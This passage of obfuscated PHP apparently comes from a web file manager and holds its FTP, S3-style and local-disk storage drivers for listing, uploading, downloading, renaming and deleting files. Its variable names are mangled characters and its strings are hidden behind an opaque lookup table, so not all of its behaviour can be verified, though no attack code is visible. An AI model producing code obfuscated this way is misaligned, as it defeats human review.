$this->pathDriver . $¥¨…àÎˆ[8] . ltrim($ê´Ğé¹, $¥¨…àÎˆ[8]); } private function _init($‘ßô˜ìï = array()) { $æ™ÒË´Ô =& $_SERVER[ˆö¿ÚÌ¼]; if (!function_exists($æ™ÒË´Ô[1456])) { throw new Exception(LNG($æ™ÒË´Ô[1457])); } $this->config = $‘ßô˜ìï; $this->charsetReset($‘ßô˜ìï); foreach ($‘ßô˜ìï as $†ÜŠ÷Æ¦ => $«şšâ¾„) { if (isset($this->{$†ÜŠ÷Æ¦})) { $this->{$†ÜŠ÷Æ¦} = $«şšâ¾„; } } return $this->_login($‘ßô˜ìï); } private function _login($™ éŒ«ó) { $×â¹»Œ =& $_SERVER[ˆö¿ÚÌ¼]; static $¨ä ğÆÛ = array(); $ıáåƒù– = md5(json_encode($™ éŒ«ó)); if (isset($¨ä ğÆÛ[$ıáåƒù–])) { foreach ($¨ä ğÆÛ[$ıáåƒù–] as $¾§ÕŠ² => $Ã¤Ê±‘ò) { $this->{$¾§ÕŠ²} = $Ã¤Ê±‘ò; } return !0; } $ƒ”ˆ ˆ± = parse_url(trim($this->server, $×â¹»Œ[8])); $this->host = $ƒ”ˆ ˆ±[$×â¹»Œ[209]]; $Ã÷İü¹Š = isset($ƒ”ˆ ˆ±[$×â¹»Œ[208]]) && $ƒ”ˆ ˆ±[$×â¹»Œ[208]] == $×â¹»Œ[1458] ? !0 : !1; $this->scheme = $Ã÷İü¹Š ? $×â¹»Œ[1459] : $×â¹»Œ[1460]; $this->port = isset($ƒ”ˆ ˆ±[$×â¹»Œ[210]]) ? $ƒ”ˆ ˆ±[$×â¹»Œ[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($×â¹»Œ[1461]) . $this->host . $×â¹»Œ[4] . $this->port, !0); return !1; } $ÎÕŸã„ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÎÕŸã„) { $this->writeLog(LNG($×â¹»Œ[1462]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $×â¹»Œ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $®ğ¦ËÑù = $this->pasv == $×â¹»Œ[91] ? !0 : !1; @ftp_pasv($this->connect, $®ğ¦ËÑù); $¨ä ğÆÛ[$ıáåƒù–] = array($×â¹»Œ[1463] => $this->connect, $×â¹»Œ[209] => $this->host, $×â¹»Œ[208] => $this->scheme, $×â¹»Œ[210] => $this->port); return $ÎÕŸã„; } private function _isconn($Çêö¤È¬ = true) { if (is_resource($this->connect)) { return !0; } if (!$Çêö¤È¬) { return !1; } return $this->_login($this->config); } public function mkfile($Ù˜ïŞşù, $å™ñŒóĞ = '', $Ô”¹ãî” = REPEAT_RENAME) { if ($this->setContent($Ù˜ïŞşù, $å™ñŒóĞ)) { return $this->getPathOuter($Ù˜ïŞşù); } $this->writeLog(LNG($_SERVER[ˆö¿ÚÌ¼][1464]), !0); return !1; } public function mkdir($ßÑò÷ß•, $Œşô µú = REPEAT_SKIP) { $Éè™˜ÇÔ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ßÑò÷ß• || $ßÑò÷ß• == $Éè™˜ÇÔ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ßÑò÷ß• = $this->iconvSystem($ßÑò÷ß•); if ($this->_isFolder($ßÑò÷ß•) || @ftp_mkdir($this->connect, $ßÑò÷ß•)) { return $this->getPathOuter($ßÑò÷ß•); } if (!$this->mkdir($this->pathFather($ßÑò÷ß•))) { return !1; } if ($ßÑò÷ß• = @ftp_mkdir($this->connect, $ßÑò÷ß•)) { return $this->getPathOuter($ßÑò÷ß•); } $¯éƒşİ‚ = __FUNCTION__ . $Éè™˜ÇÔ[1465]; $this->writeLog($¯éƒşİ‚, !0); return !1; } public function copyFile($³‡ö…˜Ÿ, $®²øÃèÀ) { if (!$this->_isconn()) { return !1; } $¬ôß¹ßŸ = $this->pathThis($this->iconvSystem($³‡ö…˜Ÿ)); $ŸÎäÏ± = $this->tempFile($¬ôß¹ßŸ); $ÌÈÖã = $this->iconvApp($ŸÎäÏ±); $this->download($³‡ö…˜Ÿ, $ÌÈÖã); $¿©ÒÏŞ— = $this->upload($®²øÃèÀ, $ÌÈÖã); $this->tempFileRemve($ŸÎäÏ±); return $¿©ÒÏŞ—; } public function moveFile($Ã½Ù¯ğ, $î¡ÑíÁò) { if (!$this->_isconn()) { return !1; } $Ã½Ù¯ğ = $this->iconvSystem($Ã½Ù¯ğ); $î¡ÑíÁò = $this->iconvSystem($î¡ÑíÁò); $ÀÆ½ø¥° = @ftp_rename($this->connect, $Ã½Ù¯ğ, $î¡ÑíÁò); if (!$ÀÆ½ø¥°) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } return $this->getPathOuter($î¡ÑíÁò); } public function delFile($×°·ë) { if (!$this->_isconn()) { return !1; } $×°·ë = $this->iconvSystem($×°·ë); $Ù££š‰Û = @ftp_delete($this->connect, $×°·ë); if (!$Ù££š‰Û) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); } return $Ù££š‰Û; } public function delFolder($—ä­«Æ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $´œßÁ© = $™ÉÍ€îˆ = array(); $this->fileList($—ä­«Æ, $´œßÁ©, $™ÉÍ€îˆ, !0); $this->listItemCache = !0; foreach ($™ÉÍ€îˆ as $€ãåì¤) { $¸ÇÕŒ¿¯ = $this->iconvSystem($€ãåì¤[$_SERVER[ˆö¿ÚÌ¼][32]]); $˜ŠÜ¦×ï = @ftp_delete($this->connect, $¸ÇÕŒ¿¯); if (!$˜ŠÜ¦×ï) { return !1; } } foreach ($´œßÁ© as $¸ÇÕŒ¿¯) { $¸ÇÕŒ¿¯ = $this->iconvSystem($¸ÇÕŒ¿¯); $˜ŠÜ¦×ï = @ftp_rmdir($this->connect, $¸ÇÕŒ¿¯); if (!$˜ŠÜ¦×ï) { return !1; } } $—ä­«Æ = $this->iconvSystem($—ä­«Æ); return @ftp_rmdir($this->connect, $—ä­«Æ); } public function rename($üµÚ¢Šç, $•ãáƒ‘Š) { $ûñƒ¨À =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->_isconn()) { return !1; } $’òğ¡œã = $this->fileNameAuto($this->pathFather($üµÚ¢Šç), $•ãáƒ‘Š); $’òğ¡œã = $this->iconvSystem($’òğ¡œã); $üµÚ¢Šç = $this->iconvSystem($üµÚ¢Šç); $ÇÚ£Ÿ = $this->pathFather($üµÚ¢Šç); $ğÇô¢ª = rtrim($ÇÚ£Ÿ, $ûñƒ¨À[8]) . $ûñƒ¨À[8] . $’òğ¡œã; $ƒ ´èäÅ = @ftp_rename($this->connect, $üµÚ¢Šç, $ğÇô¢ª); if (!$ƒ ´èäÅ) { $this->writeLog(__FUNCTION__ . $ûñƒ¨À[1465], !0); return !1; } $ğÇô¢ª = $this->iconvApp($ğÇô¢ª); return $this->getPathOuter($ğÇô¢ª); } private function folderInfo($»½Ù»í, $ÖÑó—Şæ = false) { $Ù€®ş€ =& $_SERVER[ˆö¿ÚÌ¼]; $á¬›®Š® = array($Ù€®ş€[32] => $this->pathThis($»½Ù»í), $Ù€®ş€[87] => $this->getPathOuter($Ù€®ş€[8] . $»½Ù»í), $Ù€®ş€[33] => $Ù€®ş€[78]); if ($ÖÑó—Şæ) { return $á¬›®Š®; } $á¬›®Š®[$Ù€®ş€[234]] = $á¬›®Š®[$Ù€®ş€[88]] = 0; $á¬›®Š®[$Ù€®ş€[235]] = $á¬›®Š®[$Ù€®ş€[236]] = !0; return $á¬›®Š®; } private function fileInfo($–‡™‡Ÿ , $¼“¸¼ª = false, $œ¢ï—œ = array()) { $áÚ“ƒ¯ï =& $_SERVER[ˆö¿ÚÌ¼]; $·çî×¤ = array($áÚ“ƒ¯ï[32] => $this->pathThis($–‡™‡Ÿ ), $áÚ“ƒ¯ï[87] => $this->getPathOuter($áÚ“ƒ¯ï[8] . $–‡™‡Ÿ ), $áÚ“ƒ¯ï[33] => $áÚ“ƒ¯ï[233], $áÚ“ƒ¯ï[79] => isset($œ¢ï—œ[$áÚ“ƒ¯ï[79]]) ? $œ¢ï—œ[$áÚ“ƒ¯ï[79]] : 0, $áÚ“ƒ¯ï[169] => $this->ext($–‡™‡Ÿ )); if ($¼“¸¼ª) { return $·çî×¤; } $·çî×¤[$áÚ“ƒ¯ï[234]] = $·çî×¤[$áÚ“ƒ¯ï[88]] = 0; $·çî×¤[$áÚ“ƒ¯ï[235]] = $·çî×¤[$áÚ“ƒ¯ï[236]] = !0; $˜éÀ‡  = $this->iconvSystem($–‡™‡Ÿ ); $·çî×¤[$áÚ“ƒ¯ï[88]] = @ftp_mdtm($this->connect, $˜éÀ‡ ); if (empty($œ¢ï—œ)) { $œ¢ï—œ = $this->objectMeta($–‡™‡Ÿ ); if (!$œ¢ï—œ) { return $·çî×¤; } } $·çî×¤[$áÚ“ƒ¯ï[79]] = $œ¢ï—œ[$áÚ“ƒ¯ï[79]]; return $·çî×¤; } public function size($ÚüÒã¤ ) { $ÌãŞ–ó‘ = $this->objectMeta($ÚüÒã¤ ); return $ÌãŞ–ó‘ ? $ÌãŞ–ó‘[$_SERVER[ˆö¿ÚÌ¼][79]] : 0; } public function info($Ÿë¶ÓÛ) { if ($this->isFile($Ÿë¶ÓÛ)) { return $this->fileInfo($Ÿë¶ÓÛ, 0); } else { if ($this->isFolder($Ÿë¶ÓÛ)) { return $this->folderInfo($Ÿë¶ÓÛ); } } return !1; } private function fileList($Ô”Š€Ù¿, &$¹¦™æ„ó, &$í‡ü½°, $ó­Ëô³ë = false) { $Ğ’Ô™çÌ =& $_SERVER[ˆö¿ÚÌ¼]; $Ô”Š€Ù¿ = $this->iconvSystem($Ô”Š€Ù¿); if (!$this->isFolder($Ô”Š€Ù¿)) { return !1; } $Ô”Š€Ù¿ = rtrim($Ô”Š€Ù¿, $Ğ’Ô™çÌ[8]) . $Ğ’Ô™çÌ[8]; check_abort(); $Â•şâäª = @ftp_rawlist($this->connect, $Ô”Š€Ù¿); if (!$Â•şâäª) { $Â•şâäª = array(); } $…”óªã = array($Ğ’Ô™çÌ[10] => 1, $Ğ’Ô™çÌ[1377] => 1); foreach ($Â•şâäª as $ûÕÄ¤ãŠ) { $’³ú”Ê = $this->_listItem($ûÕÄ¤ãŠ); if ($’³ú”Ê[0] == $Ğ’Ô™çÌ[843]) { continue; } $Á£•üçì = $’³ú”Ê[8]; if (empty($Á£•üçì) && $Á£•üçì !== $Ğ’Ô™çÌ[231] || isset($…”óªã[$Á£•üçì])) { continue; } $Á£•üçì = $this->iconvApp($Ô”Š€Ù¿ . ltrim($Á£•üçì, $Ğ’Ô™çÌ[8])); $É©åè = array($Ğ’Ô™çÌ[32] => $Á£•üçì, $Ğ’Ô™çÌ[33] => $Ğ’Ô™çÌ[233], $Ğ’Ô™çÌ[79] => $’³ú”Ê[4]); if (substr($ûÕÄ¤ãŠ, 0, 1) == $Ğ’Ô™çÌ[1466]) { $É©åè[$Ğ’Ô™çÌ[33]] = $Ğ’Ô™çÌ[78]; $É©åè[$Ğ’Ô™çÌ[79]] = 0; } $äÁ‘²Âß = $É©åè[$Ğ’Ô™çÌ[33]] == $Ğ’Ô™çÌ[78] ? !0 : !1; $this->cacheMethodInfoSet($Á£•üçì, $äÁ‘²Âß, $É©åè); if ($äÁ‘²Âß) { $¹¦™æ„ó[] = $Á£•üçì; if ($ó­Ëô³ë) { $this->fileList($Á£•üçì, $¹¦™æ„ó, $í‡ü½°, $ó­Ëô³ë); } continue; } $í‡ü½°[] = $É©åè; } $this->cacheMethodInfoSet($Ô”Š€Ù¿, !0); } private function _listItem($ÈÏšüéû) { if (empty($ÈÏšüéû)) { return array(); } $œ­Ñõı = preg_split($_SERVER[ˆö¿ÚÌ¼][1467], $ÈÏšüéû); if (count($œ­Ñõı) <= 9) { return $œ­Ñõı; } $œ­Ñõı[8] = trim(substr($ÈÏšüéû, strpos($ÈÏšüéû, $œ­Ñõı[7]) + strlen($œ­Ñõı[7]))); return array_splice($œ­Ñõı, 0, 9); } public function listPath($î°„‡¨, $¦ªèòÓ¶ = false) { $üòõ”¡ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->_isconn()) { return !1; } $ÖÚîá¶İ = $ŠïÏşÁù = array(); $this->fileList($î°„‡¨, $ÖÚîá¶İ, $ŠïÏşÁù); foreach ($ÖÚîá¶İ as $ÈÎœı¼ä => $‹ï§ã°ë) { $ÖÚîá¶İ[$ÈÎœı¼ä] = $this->folderInfo($‹ï§ã°ë, $¦ªèòÓ¶); } foreach ($ŠïÏşÁù as $ÈÎœı¼ä => $‹ï§ã°ë) { $ŠïÏşÁù[$ÈÎœı¼ä] = $this->fileInfo($‹ï§ã°ë[$üòõ”¡[32]], $¦ªèòÓ¶, $‹ï§ã°ë); } return array($üòõ”¡[85] => $ÖÚîá¶İ, $üòõ”¡[86] => $ŠïÏşÁù); } public function has($—š¼ºŸ, $ÇĞ¯Í¶Û = false, $¥‡«‹áÒ = true) { $ÓÙ—º‹ò =& $_SERVER[ˆö¿ÚÌ¼]; $¸Å©Í˜È = $¬›¬çÔÌ = array(); $¯ş™ê¨ú = $ÇĞ¯Í¶Û ? !0 : !1; $this->fileList($—š¼ºŸ, $¸Å©Í˜È, $¬›¬çÔÌ, $¯ş™ê¨ú); if ($ÇĞ¯Í¶Û) { return array($ÓÙ—º‹ò[242] => count($¬›¬çÔÌ), $ÓÙ—º‹ò[243] => count($¸Å©Í˜È)); } if ($¥‡«‹áÒ) { if (count($¬›¬çÔÌ)) { return !0; } } else { if (count($¸Å©Í˜È)) { return !0; } } return !1; } public function listAll($§“¡¸Â) { $š“üı¨Á =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->_isconn()) { return !1; } $´ó™‘¸Î = $Ö’¡Î§ = array(); $this->fileList($§“¡¸Â, $´ó™‘¸Î, $Ö’¡Î§, !0); $È¤à”µÔ = array_to_keyvalue($Ö’¡Î§, $š“üı¨Á[32]); foreach ($´ó™‘¸Î as $éåæÒğÔ) { if (is_string($éåæÒğÔ)) { $È¤à”µÔ[$éåæÒğÔ] = array($š“üı¨Á[79] => 0); } } return $this->listAllFiles($§“¡¸Â, $È¤à”µÔ); } public function getContent($Â¥²¢Æ) { if (!$this->_isconn()) { return !1; } $Â¥²¢Æ = $this->iconvSystem($Â¥²¢Æ); return $this->fileSubstr($Â¥²¢Æ); } public function setContent($ë¿¼Ú°Â, $§éş–Î = '') { if (!$this->_isconn()) { return !1; } $µÓË™…­ = $this->pathThis($this->iconvSystem($ë¿¼Ú°Â)); $ñö¡éà³ = $this->tempFile($µÓË™…­); file_put_contents($ñö¡éà³, $§éş–Î); $ƒŒÃœˆ = $this->upload($ë¿¼Ú°Â, $this->iconvApp($ñö¡éà³)); $this->tempFileRemve($ñö¡éà³); return $ƒŒÃœˆ; } public function fileSubstr($‰Éé„Ñ, $ëëÚúÔò = 0, $£²ÚÎèì = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($‰Éé„Ñ, $ëëÚúÔò, $£²ÚÎèì); } private function ftpRequest($âì¨ÏÊç, $¡„¦äÄı = 0, $Ë¨ªÉ‡Ë = false) { $²‘¼ôÚ‹ =& $_SERVER[ˆö¿ÚÌ¼]; $âì¨ÏÊç = $²‘¼ôÚ‹[8] . ltrim(str_ltrim($âì¨ÏÊç, $this->ftpPath), $²‘¼ôÚ‹[8]); $âì¨ÏÊç = $this->iconvSystem($âì¨ÏÊç); $Ûƒ×„Š˜ = $this->scheme . $this->host . $²‘¼ôÚ‹[4] . $this->port; $¯¢£Ï÷² = curl_init(); curl_setopt($¯¢£Ï÷², CURLOPT_URL, $Ûƒ×„Š˜ . $this->pathEncode($âì¨ÏÊç)); curl_setopt($¯¢£Ï÷², CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ë¨ªÉ‡Ë) { $æÒ¥° = $¡„¦äÄı + $Ë¨ªÉ‡Ë - 1; curl_setopt($¯¢£Ï÷², CURLOPT_RANGE, "{$¡„¦äÄı}\55{$æÒ¥°}"); } curl_setopt($¯¢£Ï÷², CURLOPT_RETURNTRANSFER, 1); $øÓ²åÚ = curl_exec($¯¢£Ï÷²); curl_close($¯¢£Ï÷²); return $øÓ²åÚ; } public function upload($«ºËìûÄ, $°³ˆÎ€„, $ïßŸ—²ì = false, $»’œ  = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($«ºËìûÄ))) { return !1; } $«ºËìûÄ = $this->iconvSystem($«ºËìûÄ); $°³ˆÎ€„ = $this->iconvSystem($°³ˆÎ€„); $ÂÆĞë¦ = ftp_nb_put($this->connect, $«ºËìûÄ, $°³ˆÎ€„, FTP_BINARY); while ($ÂÆĞë¦ == FTP_MOREDATA) { $ÂÆĞë¦ = ftp_nb_continue($this->connect); } if ($ÂÆĞë¦ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } return $this->getPathOuter($«ºËìûÄ); } public function download($µ¥¨ê¿‚, $¶–ÖÚÙ· = '') { if (!$this->_isconn()) { return !1; } $®¤—ê˜— = $this->pathFather($¶–ÖÚÙ·); if (!IO::mkdir($®¤—ê˜—)) { return !1; } $µ¥¨ê¿‚ = $this->iconvSystem($µ¥¨ê¿‚); $¶–ÖÚÙ· = $this->iconvSystem($¶–ÖÚÙ·); $“´°ƒ¿Ä = ftp_nb_get($this->connect, $¶–ÖÚÙ·, $µ¥¨ê¿‚, FTP_BINARY); while ($“´°ƒ¿Ä == FTP_MOREDATA) { $“´°ƒ¿Ä = ftp_nb_continue($this->connect); } if ($“´°ƒ¿Ä != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } return $this->iconvApp($¶–ÖÚÙ·); } public function exist($›§ú ÜÀ) { return $this->isFile($›§ú ÜÀ) || $this->isFolder($›§ú ÜÀ); } public function isFile($¹—ªóŞ) { return !$this->isFolder($¹—ªóŞ) && $this->objectMeta($¹—ªóŞ); } public function isFolder($íËŸ ÁÖ) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][180], $íËŸ ÁÖ); } protected function objectMeta($ ŸŠßÈ©) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][182], $ ŸŠßÈ©); } protected function _objectMeta($óœÆ¬Î¥) { $Õôš×ß =& $_SERVER[ˆö¿ÚÌ¼]; if ($óœÆ¬Î¥ == $Õôš×ß[12] || $óœÆ¬Î¥ == $Õôš×ß[8]) { return array(); } if (!$this->_isconn()) { return !1; } $óœÆ¬Î¥ = $this->iconvSystem($óœÆ¬Î¥); $ö†•åØâ = array($Õôš×ß[32] => $this->iconvApp($óœÆ¬Î¥), $Õôš×ß[33] => $Õôš×ß[233], $Õôš×ß[79] => 0); $ÑªÂØÍ¸ = @ftp_size($this->connect, $óœÆ¬Î¥); if ($ÑªÂØÍ¸ != -1) { $ö†•åØâ[$Õôš×ß[79]] = $ÑªÂØÍ¸; } else { $°ö•šÛñ = @ftp_chdir($this->connect, $óœÆ¬Î¥); if (!$°ö•šÛñ) { return !1; } @ftp_chdir($this->connect, $Õôš×ß[8]); $ö†•åØâ[$Õôš×ß[33]] = $Õôš×ß[78]; } return $ö†•åØâ; } protected function _isFolder($äõøÒ¸‚) { $‡÷ô¨ü =& $_SERVER[ˆö¿ÚÌ¼]; if ($äõøÒ¸‚ == $‡÷ô¨ü[12] || $äõøÒ¸‚ == $‡÷ô¨ü[8]) { return !0; } $ôö‹ŠŞ = $this->_objectMeta($äõøÒ¸‚); return isset($ôö‹ŠŞ[$‡÷ô¨ü[33]]) && $ôö‹ŠŞ[$‡÷ô¨ü[33]] == $‡÷ô¨ü[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¯óâá²“) { parent::__construct($¯óâá²“); $this->setSignVersion($_SERVER[ˆö¿ÚÌ¼][250]); } public function uploadLink($é‹Ëıâ«, $ÉÙ‚¨ä‹ = 0) { $¹«¨ÎØˆ =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isUploadServer()) { return; } $ò¢¡€ = $this->getType(); if (!in_array($ò¢¡€, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $†”†ÊÕ½ = (!$ÉÙ‚¨ä‹ ? 1 : ceil($ÉÙ‚¨ä‹ / pow(1024, 3))) * 3600 * 4; $ÆÇ‹…š¬ = $this->uploadMultiData($é‹Ëıâ«, $†”†ÊÕ½); if ($ÆÇ‹…š¬) { $ÆÇ‹…š¬[$¹«¨ÎØˆ[97]] = $é‹Ëıâ«; $ÆÇ‹…š¬[$¹«¨ÎØˆ[98]] = $ò¢¡€; } return $ÆÇ‹…š¬; } public function fileOutImage($¨©À©ûÈ, $™¢ãÖÒ = 250) { if ($this->size($¨©À©ûÈ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¨©À©ûÈ, $™¢ãÖÒ); } $‚ø¡ş„û = $this->link($¨©À©ûÈ); $‚ø¡ş„û .= $_SERVER[ˆö¿ÚÌ¼][1468] . $™¢ãÖÒ; $this->fileOutLink($‚ø¡ş„û); } public function fileOutLink($ñÔò—éï) { $ÊÙ«‚Ñ =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($ñÔò—éï, 0, 7) == $ÊÙ«‚Ñ[219]) { $ñÔò—éï = $ÊÙ«‚Ñ[220] . substr($ñÔò—éï, 7); } header($ÊÙ«‚Ñ[175] . $ñÔò—éï); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ê²İ‹Ş²) { if (substr($ê²İ‹Ş², 0, 2) == $_SERVER[ˆö¿ÚÌ¼][1425]) { $ê²İ‹Ş² = BASIC_PATH . substr($ê²İ‹Ş², 2); } return $ê²İ‹Ş²; } public function iconvApp($Åğñåªİ) { $õ’ëúÄØ =& $_SERVER[ˆö¿ÚÌ¼]; global $config; return $this->iconvTo($Åğñåªİ, $config[$õ’ëúÄØ[1454]], $config[$õ’ëúÄØ[1453]]); } public function iconvSystem($õßò‘àÌ) { $™éØÌãê =& $_SERVER[ˆö¿ÚÌ¼]; global $config; return $this->iconvTo($õßò‘àÌ, $config[$™éØÌãê[1453]], $config[$™éØÌãê[1454]]); } public function getPathOuter($É“«Ã»˜) { $Õ•ƒ¦ûÃ =& $_SERVER[ˆö¿ÚÌ¼]; $âÚõúë = $this->iconvApp($this->pathBase); $É“«Ã»˜ = $this->iconvApp($É“«Ã»˜); if (substr($âÚõúë, 0, 2) == $Õ•ƒ¦ûÃ[1425]) { $âÚõúë = BASIC_PATH . substr($âÚõúë, 2); } if (substr($É“«Ã»˜, 0, 2) == $Õ•ƒ¦ûÃ[1425]) { $É“«Ã»˜ = BASIC_PATH . substr($É“«Ã»˜, 2); } $âÚõúë = KodIO::clear($âÚõúë); $É“«Ã»˜ = KodIO::clear($É“«Ã»˜); $É“«Ã»˜ = substr($É“«Ã»˜, strlen($âÚõúë)); if (empty($this->pathDriver)) { return $É“«Ã»˜; } return $this->pathDriver . $Õ•ƒ¦ûÃ[8] . ltrim($É“«Ã»˜, $Õ•ƒ¦ûÃ[8]); } public function mkfile($™ú† å, $•ÂÇÌª¹ = '', $±² ˜Ù® = REPEAT_RENAME) { $™ú† å = $this->iconvSystem($™ú† å); @touch($™ú† å); if ($•ÂÇÌª¹) { file_put_contents($™ú† å, $•ÂÇÌª¹); } @chmod($™ú† å, $this->pathAuth); if (is_file($™ú† å)) { return $this->getPathOuter($™ú† å); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } public function mkdir($Èµé‚—, $¬¬À¯Üö = REPEAT_SKIP) { $Èµé‚— = $this->iconvSystem($Èµé‚—); if (is_dir($Èµé‚—)) { return $this->getPathOuter($Èµé‚—); } @mkdir($Èµé‚—, $this->pathAuth, !0); @chmod($Èµé‚—, $this->pathAuth); if (is_dir($Èµé‚—)) { return $this->getPathOuter($Èµé‚—); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } public function copyFile($¿£Öõ—Ÿ, $¨…‚Ï·ñ) { $this->mkdir($this->pathFather($¨…‚Ï·ñ)); $¿£Öõ—Ÿ = $this->iconvSystem($¿£Öõ—Ÿ); $¨…‚Ï·ñ = $this->iconvSystem($¨…‚Ï·ñ); $ÍòúÚ˜ê = copy_64($¿£Öõ—Ÿ, $¨…‚Ï·ñ); @chmod($¨…‚Ï·ñ, $this->pathAuth); if ($ÍòúÚ˜ê) { return $this->getPathOuter($¨…‚Ï·ñ); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } public function moveFile($Ä©Œ„Êª, $ÏêÄ³³) { $this->mkdir($this->pathFather($ÏêÄ³³)); $Ä©Œ„Êª = $this->iconvSystem($Ä©Œ„Êª); $ÏêÄ³³ = $this->iconvSystem($ÏêÄ³³); $¶£ºæÙ = intval(@rename($Ä©Œ„Êª, $ÏêÄ³³)); if (!$¶£ºæÙ) { if ($¶£ºæÙ = intval(@copy_64($Ä©Œ„Êª, $ÏêÄ³³))) { @unlink($Ä©Œ„Êª); } } @chmod($ÏêÄ³³, $this->pathAuth); if ($¶£ºæÙ) { return $this->getPathOuter($ÏêÄ³³); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } public function movePath($ŞúÂå¡, $óÊĞÊæá, $¸õ‚¸¢ = false) { $ÉÂÃÃÈ¼ =& $_SERVER[ˆö¿ÚÌ¼]; $ŞúÂå¡ = $this->iconvSystem($ŞúÂå¡); $óÊĞÊæá = $this->iconvSystem($óÊĞÊæá); $…µÚÀ¼« = rtrim($óÊĞÊæá, $ÉÂÃÃÈ¼[8]) . $ÉÂÃÃÈ¼[8] . ($¸õ‚¸¢ ? $¸õ‚¸¢ : get_path_this($ŞúÂå¡)); if (file_exists($…µÚÀ¼«)) { return !1; } $òÇàŒìı = intval(@rename($ŞúÂå¡, $…µÚÀ¼«)); $òÇàŒìı = file_exists($…µÚÀ¼«); if ($òÇàŒìı) { return $this->getPathOuter($…µÚÀ¼«); } $this->writeLog(__FUNCTION__ . $ÉÂÃÃÈ¼[1465], !0); return !1; } public function delFile($œ›Œã‹É) { $œ›Œã‹É = $this->iconvSystem($œ›Œã‹É); if (!@unlink($œ›Œã‹É)) { @chmod($œ›Œã‹É, $this->pathAuth); if (@unlink($œ›Œã‹É)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); return !1; } return !0; } public function delFolder($º“İ¤ßå) { $œÍ—á‰Ä =& $_SERVER[ˆö¿ÚÌ¼]; $º“İ¤ßå = $this->iconvSystem($º“İ¤ßå); if (!is_dir($º“İ¤ßå)) { return !0; } if (!($Éè¼¢ºï = opendir($º“İ¤ßå))) { return !1; } while (($Èæƒ° = readdir($Éè¼¢ºï)) !== !1) { if ($Èæƒ° == $œÍ—á‰Ä[10] || $Èæƒ° == $œÍ—á‰Ä[1377]) { continue; } $˜«ÁÏúÀ = $º“İ¤ßå . $œÍ—á‰Ä[8] . $Èæƒ°; if (is_file($˜«ÁÏúÀ) || is_link($˜«ÁÏúÀ)) { if (!unlink($˜«ÁÏúÀ)) { chmod($˜«ÁÏúÀ, $this->pathAuth); if (!unlink($˜«ÁÏúÀ)) { return !1; } } } else { if (is_dir($˜«ÁÏúÀ)) { chmod($˜«ÁÏúÀ, $this->pathAuth); $˜«ÁÏúÀ = $this->iconvApp($˜«ÁÏúÀ); if (!$this->delFolder($˜«ÁÏúÀ)) { return !1; } } } } closedir($Éè¼¢ºï); return rmdir($º“İ¤ßå); } public function rename($´ÖßŸ÷Ö, $œ›òÇ’Å) { $Â„Å¶€· =& $_SERVER[ˆö¿ÚÌ¼]; $Å…¶Ï¢ = $this->fileNameAuto($this->pathFather($´ÖßŸ÷Ö), $œ›òÇ’Å); $Å…¶Ï¢ = $this->iconvSystem($Å…¶Ï¢); $´ÖßŸ÷Ö = $this->iconvSystem($´ÖßŸ÷Ö); $Û­Ø†øĞ = $this->pathFather($´ÖßŸ÷Ö); $çˆ¤‡ = rtrim($Û­Ø†øĞ, $Â„Å¶€·[8]) . $Â„Å¶€·[8] . $Å…¶Ï¢; $Ã°®Œœ‰ = @rename($´ÖßŸ÷Ö, $çˆ¤‡); $çˆ¤‡ = $this->iconvApp($çˆ¤‡); if ($Ã°®Œœ‰) { return $this->getPathOuter($çˆ¤‡); } $this->writeLog(__FUNCTION__ . $Â„Å¶€·[1465], !0); return !1; } public function size($Ò÷ßõÊ½) { $Ò÷ßõÊ½ = $this->iconvSystem($Ò÷ßõÊ½); return filesize_64($Ò÷ßõÊ½); } public function info($Èä¬°Âˆ) { $Èä¬°Âˆ = $this->iconvSystem($Èä¬°Âˆ); if ($this->isFolder($Èä¬°Âˆ)) { return $this->folderInfo($Èä¬°Âˆ); } else { if ($this->isFile($Èä¬°Âˆ)) { return $this->fileInfo($Èä¬°Âˆ); } } return !1; } protected function infoChildren($êĞ±¦„¦, &$¥¦ƒØà, $õ®²„íÀ = true) { $ªĞ°ŒÇç =& $_SERVER[ˆö¿ÚÌ¼]; check_abort_echo(); $êĞ±¦„¦ = rtrim($êĞ±¦„¦, $ªĞ°ŒÇç[8]) . $ªĞ°ŒÇç[8]; if ($õ®²„íÀ) { $êĞ±¦„¦ = 